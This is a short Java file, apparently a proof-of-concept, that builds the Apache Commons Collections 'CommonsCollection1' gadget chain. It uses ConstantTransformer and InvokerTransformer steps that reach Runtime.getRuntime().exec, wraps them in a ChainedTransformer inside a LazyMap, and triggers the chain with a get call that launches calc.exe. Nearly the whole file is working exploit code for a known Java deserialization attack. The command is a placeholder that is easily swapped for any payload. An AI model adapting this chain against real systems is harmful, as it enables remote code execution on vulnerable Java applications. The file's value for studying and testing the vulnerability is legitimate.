import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.LazyMap;

import java.util.HashMap;
import java.util.Map;

public class CommonsCollection1Payload {
    public static void main(String... args) {
        String[] command = {"calc.exe"};
        final Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(Runtime.class), //(1)
                new InvokerTransformer("getMethod",
                        new Class[]{String.class, Class[].class},
                        new Object[]{"getRuntime", new Class[0]}
                ), //(2)
                new InvokerTransformer("invoke",
                        new Class[]{Object.class, Object[].class},
                        new Object[]{null, new Object[0]}
                ), //(3)
                new InvokerTransformer("exec",
                        new Class[]{String.class},
                        command
                ) //(4)
        };
        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);
        Map map = new HashMap<>();
        Map lazyMap = LazyMap.decorate(map, chainedTransformer);
        lazyMap.get("spl4yer");
    }
}
